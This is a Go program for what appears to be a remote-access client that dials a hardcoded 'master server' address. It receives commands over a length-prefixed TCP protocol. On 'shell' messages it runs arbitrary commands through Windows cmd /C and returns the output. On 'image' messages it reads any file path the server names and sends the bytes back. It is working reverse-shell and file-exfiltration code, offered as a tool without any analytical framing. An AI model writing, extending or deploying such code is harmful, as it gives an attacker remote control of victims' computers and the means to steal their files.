package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

type MasterServer struct {
	ip   string
	port string
}

func (m *MasterServer) connectIntoServer() (net.Conn, error) {
	conn, err := net.Dial("tcp", m.ip+":"+m.port)
	if err != nil {
		fmt.Println(err)
		fmt.Println("The Server Might Be Down")
		return nil, err
	}
	fmt.Println(conn)
	return conn, nil
}

func handleServer(conn net.Conn) {
	defer conn.Close()
	go func() {
		for {
			MsgLength := make([]byte, 4)
			_, err := io.ReadFull(conn, MsgLength)
			if err != nil {
				if err == io.EOF {
					fmt.Println("The User Has Been Disconnected ahahaha", err)
					return
				}
				fmt.Println("There was an error accured", err)
				return
			}
			fullMsgLength := binary.BigEndian.Uint32(MsgLength)
			realMsg := make([]byte, fullMsgLength)
			if _, err := io.ReadFull(conn, realMsg); err != nil {
				fmt.Print("There Was an error during Message reading", err)
			}
			physicalMessage := string(realMsg)
			Parts := strings.SplitN(physicalMessage, " ", 3)
			if Parts[0] == "shell" && len(Parts) <= 3 && len(Parts) >= 2 {
				if Parts[1] == "cd" && Parts[2] != "" {
					os.Chdir(Parts[2])
					dir, err := os.Getwd()
					if err != nil {
						fmt.Println(err)
						sendCmdError(conn, err)
						continue
					}
					sendingData(conn, dir)
					continue
				}
				fullCmd := strings.Join(Parts[1:], " ")
				cmd := exec.Command("cmd", "/C", fullCmd)
				output, err := cmd.Output()
				if err != nil {
					fmt.Println(err)
					sendCmdError(conn, err)
					continue
				}
				sendingData(conn, string(output))
				continue
			}
			if Parts[0] == "image" {
				path := Parts[1]
				ImageName := Parts[2]
				fullElement := []string{Parts[0], ImageName}
				realThing := strings.Join(fullElement, " ")
				fileinfo, err := os.Stat(path)
				if err != nil {
					fmt.Println(err)
					continue
				}
				if fileinfo.IsDir() {
					fmt.Println("this a directory and not an image")
					continue
				}
				imageBytes, err := os.ReadFile(path)
				//

				imageMsgLength := make([]byte, 4)
				binary.BigEndian.PutUint32(imageMsgLength, uint32(len(realThing)))

				if _, err := conn.Write(imageMsgLength); err != nil {
					if err == io.EOF {
						fmt.Println("The Flow of connection was corrupted", err)
						continue
					}
					fmt.Println(err)
					continue
				}
				commandIntoByte := []byte(realThing)
				if _, err := conn.Write(commandIntoByte); err != nil {
					fmt.Println(err)
					continue
				}

				//
				if err != nil {
					fmt.Println("this error have Ocur while handling the Read : ", err)
					continue
				}

				imageLength := make([]byte, 4)
				binary.BigEndian.PutUint32(imageLength, uint32(len(imageBytes)))

				if _, err := conn.Write(imageLength); err != nil {
					if err == io.EOF {
						fmt.Println("The Flow of connection was corrupted", err)
						continue
					}
					fmt.Println(err)
					continue
				}

				if _, err := conn.Write(imageBytes); err != nil {
					fmt.Println(err)
					continue
				}
				fmt.Printf("Client> ")
				continue
			}
			fmt.Printf("\rServer:> %s\nClient> ", physicalMessage)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	fmt.Printf("Client> ")
	for scanner.Scan() {
		serverCommand := scanner.Text()
		MsgLength := make([]byte, 4)
		binary.BigEndian.PutUint32(MsgLength, uint32(len(serverCommand)))

		if _, err := conn.Write(MsgLength); err != nil {
			if err == io.EOF {
				fmt.Println("Print The connection with server is Down")
				return
			}
			fmt.Println("The Connection Has Ended Due", err)
			return
		}

		serverMsg := []byte(serverCommand)
		_, err := conn.Write(serverMsg)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Printf("Client> ")

	}
}

func sendCmdError(conn net.Conn, shellError error) error {
	errLength := make([]byte, 4)
	errorMsg := (shellError).Error()
	binary.BigEndian.PutUint32(errLength, uint32(len(errorMsg)))
	if _, err := conn.Write(errLength); err != nil {
		return err
	}
	errorMessage := []byte(errorMsg)
	if _, err := conn.Write(errorMessage); err != nil {
		return err
	}
	return nil

}
func sendingData(conn net.Conn, data string) error {
	dataLength := make([]byte, 4)
	binary.BigEndian.PutUint32(dataLength, uint32(len(data)))
	if _, err := conn.Write(dataLength); err != nil {
		return err
	}
	dataIntoByte := []byte(data)
	if _, err := conn.Write(dataIntoByte); err != nil {
		return err
	}
	return nil
}
func main() {
	var ip, port string

	ip = "192.168.1.10"
	port = "6060"

	master := MasterServer{
		ip:   ip,
		port: port,
	}

	conn, err := master.connectIntoServer()
	if err != nil {
		fmt.Println("Failed to connect to master server")
		return
	}

	handleServer(conn)

}
